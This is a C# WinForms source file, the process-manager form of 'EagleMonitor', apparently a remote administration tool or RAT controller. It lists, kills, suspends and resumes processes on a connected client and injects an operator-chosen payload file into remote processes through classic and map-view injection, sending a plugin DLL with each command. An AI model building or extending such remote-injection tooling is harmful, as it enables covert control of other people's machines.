using EagleMonitor.Controls;
using EagleMonitor.Networking;
using System;
using System.Windows.Forms;
using PacketLib.Packet;
using PacketLib;
using System.IO;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class ProcessManagerForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }

        internal ProcessManagerForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private void ProcessManagerForm_Load(object sender, EventArgs e)
        {
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(processDataGridView, guna2VScrollBar1, true);
        }

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
            {
                int procId = int.Parse(selected.Cells[1].Value.ToString());
                ProcessKillerPacket processKillerPacket = new ProcessKillerPacket(procId, selected.Cells[2].Value.ToString(), selected.Index);
                processKillerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
                clientHandler.SendPacket(processKillerPacket);
            }
        }

        private void suspendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
            {
                int procId = int.Parse(selected.Cells[1].Value.ToString());
                SuspendProcessPacket suspendProcessPacket = new SuspendProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index);
                suspendProcessPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
                clientHandler.SendPacket(suspendProcessPacket);
            }
        }

        private void resumeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
            {
                int procId = int.Parse(selected.Cells[1].Value.ToString());
                ResumeProcessPacket resumeProcessPacket = new ResumeProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index);
                resumeProcessPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
                clientHandler.SendPacket(resumeProcessPacket);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProcessManagerPacket processManagerPacket = new ProcessManagerPacket();
            processManagerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            clientHandler.SendPacket(processManagerPacket);
            this.processDataGridView.Rows.Clear();
        }

        private void classicToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog()) 
            {
                if (ofd.ShowDialog() == DialogResult.OK) 
                {
                    foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
                    {
                        int procId = int.Parse(selected.Cells[1].Value.ToString());
                        byte[] payload = Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1);
                        ProcessInjectionPacket processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.CLASSIC, procId);
                        processInjectionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
                        clientHandler.SendPacket(processInjectionPacket);
                    }
                }
            }
        }

        private void mapViewToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
                    {
                        int procId = int.Parse(selected.Cells[1].Value.ToString());
                        byte[] payload = Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1);
                        ProcessInjectionPacket processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.MAP_VIEW, procId);
                        processInjectionPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
                        clientHandler.SendPacket(processInjectionPacket);
                    }
                }
            }
        }

        private void processDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = processDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    processDataGridView.ClearSelection();
                    processDataGridView.CurrentCell = null;
                }
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
